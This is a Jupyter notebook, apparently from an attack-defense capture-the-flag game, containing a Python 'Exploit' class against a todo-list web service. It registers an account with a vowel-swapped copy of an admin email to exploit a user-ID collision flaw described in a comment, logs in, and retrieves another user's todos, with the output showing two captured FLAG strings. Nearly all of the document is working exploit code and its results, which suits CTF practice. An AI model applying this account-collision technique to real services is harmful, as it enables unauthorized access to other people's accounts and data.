{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "57d3ece24f6139ca",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-09-12T15:07:08.388457400Z",
     "start_time": "2024-09-12T15:07:08.377225800Z"
    },
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "import logging\n",
    "import random\n",
    "import string\n",
    "from bs4 import BeautifulSoup\n",
    "from typing import List\n",
    "import requests\n",
    "\n",
    "def generate_random_password(length: int, seed: int, special_char=False) -> str:\n",
    "    myrandom = random.Random(seed)\n",
    "    # Define the character set: lowercase letters, uppercase letters, and digits\n",
    "    characters = string.ascii_letters + string.digits\n",
    "    if special_char:\n",
    "        characters += string.punctuation\n",
    "    # Use random.choices to select random characters from the character set\n",
    "    random_string = ''.join(myrandom.choices(characters, k=length))\n",
    "    return random_string\n",
    "\n",
    "def extract_verification_token(html_content: str):\n",
    "    soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "    return soup.find(\"input\", {\"name\": \"__RequestVerificationToken\"})[\"value\"]\n",
    "\n",
    "\n",
    "def extract_todos(html_content: str) -> List[str]:\n",
    "    \"\"\"\n",
    "    :param html_content: s.get(list_todos_url).text\n",
    "    :return: list of todo descriptions\n",
    "    \"\"\"\n",
    "    # Parse the HTML content using Beautiful Soup\n",
    "    soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "\n",
    "    # Find all <p> elements within the main container where todos are listed\n",
    "    todos = []\n",
    "    for div in soup.find_all('div', class_='todo-description'):  # TODO check if this still only filters for todos\n",
    "        todos.append(div.get_text(strip=True))\n",
    "    return todos\n",
    "\n",
    "\n",
    "def extract_filters(html_content: str):\n",
    "    soup = BeautifulSoup(html_content, \"html.parser\")\n",
    "    # Find all <p> elements within the main container where todos are listed\n",
    "    filters_dict = {}\n",
    "    filters = soup.find_all('option', class_='filter')\n",
    "    if not isinstance(filters, list):\n",
    "        filters = [filters]\n",
    "    for f in filters:\n",
    "        if \"value\" in f.attrs:\n",
    "            filters_dict[f.get_text()] = f.attrs[\"value\"]\n",
    "    return filters_dict\n",
    "\n",
    "\n",
    "class Exploit():\n",
    "    def __init__(self, ip: str, email: str):\n",
    "        self.ip = ip\n",
    "        self.email = email\n",
    "        self.team = 42\n",
    "        self.password = f\"{generate_random_password(40, self.team ,True)}\"\n",
    "        self.web_app_port = 8080\n",
    "        self.base_url = f'http://[{ip}]:{self.web_app_port}/'\n",
    "        self.register_url = self.base_url + 'Identity/Account/Register'\n",
    "        self.login_url = self.base_url + 'Identity/Account/Login'\n",
    "        self.list_todos_url = self.base_url + 'Todo/ListTodos'\n",
    "        self.add_todo_url = self.base_url + 'Todo/AddTodo'\n",
    "        self.import_url = self.base_url + 'Todo/Import'\n",
    "        self.export_url = self.base_url + 'Todo/Export'\n",
    "        self.add_filter_url = self.base_url + \"Todo/AddFilter\"\n",
    "        self.apply_filter_url = self.base_url + \"Todo/ApplyFilter\"\n",
    "        self.logout_url = self.base_url + 'Identity/Account/Logout'\n",
    "        self.session = requests.Session()\n",
    "\n",
    "        logging.info(f\"ip: {ip}, team: {self.team}\")\n",
    "        logging.info(f\"email: {self.email}, password: {self.password}\")\n",
    "        self.register_user()\n",
    "\n",
    "    def register_user(self):\n",
    "        r = self.session.get(self.register_url)\n",
    "        data = {\"Input.Email\": self.email,\n",
    "                \"Input.Password\": self.password,\n",
    "                \"Input.ConfirmPassword\": self.password,\n",
    "                \"__RequestVerificationToken\": extract_verification_token(r.text)}\n",
    "        r2 = self.session.post(self.register_url, data=data)\n",
    "        if \"is already taken.\" in r2.text:\n",
    "            print(f\"{self.email} already taken\")\n",
    "\n",
    "    def login(self):\n",
    "        r = self.session.get(self.login_url)\n",
    "        data = {\"Input.Email\": self.email,\n",
    "                \"Input.Password\": self.password,\n",
    "                \"__RequestVerificationToken\": extract_verification_token(r.text),\n",
    "                \"Input.RememberMe\": \"True\"}\n",
    "        r2 = self.session.post(self.login_url, data=data)\n",
    "        if \"Invalid login attempt.\" in r2.text:\n",
    "            logging.error(f\"{self.email} {self.password}   :   invalid login attempt\")\n",
    "\n",
    "    def get_todos(self) -> List[str]:\n",
    "        r = self.session.get(self.list_todos_url)\n",
    "        return extract_todos(r.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "a210c757f6a59021",
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-09-14T15:22:20.732889100Z",
     "start_time": "2024-09-14T15:22:20.727428600Z"
    }
   },
   "outputs": [],
   "source": [
    "ip = '::1'\n",
    "email = 'odmin@todo-list-service-hadfo.de' #vocals can be interchanged arbitrarily, since they get replaced with the number 1 in the UserManager.GetUserId method "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "d8063706f037e86b",
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-09-14T15:22:21.451412300Z",
     "start_time": "2024-09-14T15:22:21.296147100Z"
    }
   },
   "outputs": [],
   "source": [
    "exploiter = Exploit(ip, email)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "a2dad535b288bd1e",
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-09-14T15:22:21.650362400Z",
     "start_time": "2024-09-14T15:22:21.531237Z"
    }
   },
   "outputs": [],
   "source": [
    "exploiter.login()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "cc3aa05fb5aeec08",
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-09-14T15:22:49.576691300Z",
     "start_time": "2024-09-14T15:22:49.445068400Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": "['FLAG_Q1RGLUdBTUVTRVJ8RVi1tLpcJyChhd0n',\n 'FLAG_Q1RGLUdBTx1TRVJ8RVgu9gkvlLPecSVg']"
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "exploiter.get_todos()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ed961eeb005a9f2e",
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
